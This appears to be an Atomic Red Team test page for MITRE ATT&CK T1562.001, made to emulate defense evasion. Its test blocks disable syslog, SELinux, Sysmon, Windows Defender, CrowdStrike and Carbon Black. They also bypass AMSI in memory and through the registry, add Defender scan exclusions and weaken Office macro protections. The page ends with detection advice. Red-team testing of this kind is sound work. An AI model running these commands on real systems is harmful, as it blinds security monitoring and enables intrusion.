# T1562.001 - Impair Defenses: Disable or Modify Tools
Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Disable syslog
Disables syslog collection

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service rsyslog stop
  chkconfig off rsyslog
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop rsyslog
  systemctl disable rsyslog
fi
```

Invoke-AtomicTest T1562.001 -TestNumbers 1

### Atomic Test #2 - Disable Cb Response
Disable the Cb Response service

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service cbdaemon stop
  chkconfig off cbdaemon
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop cbdaemon
  systemctl disable cbdaemon
fi
```

Invoke-AtomicTest T1562.001 -TestNumbers 2

### Atomic Test #3 - Disable SELinux
Disables SELinux enforcement

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
setenforce 0
```

Invoke-AtomicTest T1562.001 -TestNumbers 3

### Atomic Test #4 - Stop Crowdstrike Falcon on Linux
Stop and disable Crowdstrike Falcon on Linux

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
sudo systemctl stop falcon-sensor.service
sudo systemctl disable falcon-sensor.service
```

Invoke-AtomicTest T1562.001 -TestNumbers 4

### Atomic Test #5 - Disable Carbon Black Response
Disables Carbon Black Response

**Supported Platforms:** macos
#### Attack Commands: Run with `sh`
```sh
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
```

Invoke-AtomicTest T1562.001 -TestNumbers 5

### Atomic Test #6 - Disable LittleSnitch
Disables LittleSnitch

**Supported Platforms:** macos
#### Attack Commands: Run with `sh`
```sh
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
```

Invoke-AtomicTest T1562.001 -TestNumbers 6

### Atomic Test #7 - Disable OpenDNS Umbrella
Disables OpenDNS Umbrella

**Supported Platforms:** macos
#### Attack Commands: Run with `sh`
```sh
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
```

Invoke-AtomicTest T1562.001 -TestNumbers 7

### Atomic Test #8 - Stop and unload Crowdstrike Falcon on macOS
Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS

**Supported Platforms:** macos
#### Attack Commands: Run with `sh`
```sh
sudo launchctl unload #{falcond_plist}
sudo launchctl unload #{userdaemon_plist}
```

Invoke-AtomicTest T1562.001 -TestNumbers 8

### Atomic Test #9 - Unload Sysmon Filter Driver
Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
run the prereq_command's and it should fail with an error of "sysmon filter must be loaded".

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
fltmc.exe unload #{sysmon_driver}
```

Invoke-AtomicTest T1562.001 -TestNumbers 9

### Atomic Test #10 - Uninstall Sysmon
Uninstall Sysinternals Sysmon for Defense Evasion

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
sysmon -u
```

Invoke-AtomicTest T1562.001 -TestNumbers 10

### Atomic Test #11 - AMSI Bypass - AMSI InitFailed
Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
Upon execution, no output is displayed.

https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Invoke-AtomicTest T1562.001 -TestNumbers 11

### Atomic Test #12 - AMSI Bypass - Remove AMSI Provider Reg Key
With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

Invoke-AtomicTest T1562.001 -TestNumbers 12

### Atomic Test #13 - Disable Arbitrary Security Windows Service
With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
To verify that the service has stopped, run "sc query McAfeeDLPAgentService"

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
net.exe stop #{service_name}
sc.exe config #{service_name} start= disabled
```

Invoke-AtomicTest T1562.001 -TestNumbers 13

### Atomic Test #14 - Tamper with Windows Defender ATP PowerShell
Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableBlockAtFirstSeen 1
```

Invoke-AtomicTest T1562.001 -TestNumbers 14

### Atomic Test #15 - Tamper with Windows Defender Command Prompt
Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
will be displayed twice and the WinDefend service status will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
sc stop WinDefend
sc config WinDefend start=disabled
sc query WinDefend
```

Invoke-AtomicTest T1562.001 -TestNumbers 15

### Atomic Test #16 - Tamper with Windows Defender Registry
Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
grayed out and have no info.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
```

Invoke-AtomicTest T1562.001 -TestNumbers 16

### Atomic Test #17 - Disable Microsoft Office Security Features
Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
show any warning before editing the document.


https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
```

Invoke-AtomicTest T1562.001 -TestNumbers 17

### Atomic Test #18 - Remove Windows Defender Definition Files
Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
command will say completed.

https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Invoke-AtomicTest T1562.001 -TestNumbers 18

### Atomic Test #19 - Stop and Remove Arbitrary Security Windows Service
Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Stop-Service -Name #{service_name}
Remove-Service -Name #{service_name}
```

Invoke-AtomicTest T1562.001 -TestNumbers 19

### Atomic Test #20 - Uninstall Crowdstrike Falcon on Windows
Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}```

Invoke-AtomicTest T1562.001 -TestNumbers 20

### Atomic Test #21 - Tamper with Windows Defender Evade Scanning -Folder
Malware can exclude a specific path from being scanned and evading detection. 
Upon successul execution, the file provided should be on the list of excluded path. 
To check the exclusion list using poweshell (Get-MpPreference).ExclusionPath 

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$excludedpath= "#{excluded_folder}"
Add-MpPreference -ExclusionPath $excludedpath```

Invoke-AtomicTest T1562.001 -TestNumbers 21

### Atomic Test #22 - Tamper with Windows Defender Evade Scanning -Extension
Malware can exclude specific extensions from being scanned and evading detection. 
Upon successful execution, the extension(s) should be on the list of excluded extensions.
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$excludedExts= "#{excluded_exts}"
Add-MpPreference -ExclusionExtension  $excludedExts```

Invoke-AtomicTest T1562.001 -TestNumbers 22

### Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Process
Malware can exclude specific processes from being scanned and evading detection.
Upon successful execution, the process(es) should be on the list of excluded processes. 
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess."

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$excludedProcess = "#{excluded_process}"
Add-MpPreference -ExclusionProcess $excludedProcess```

Invoke-AtomicTest T1562.001 -TestNumbers 23

## Detection
Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.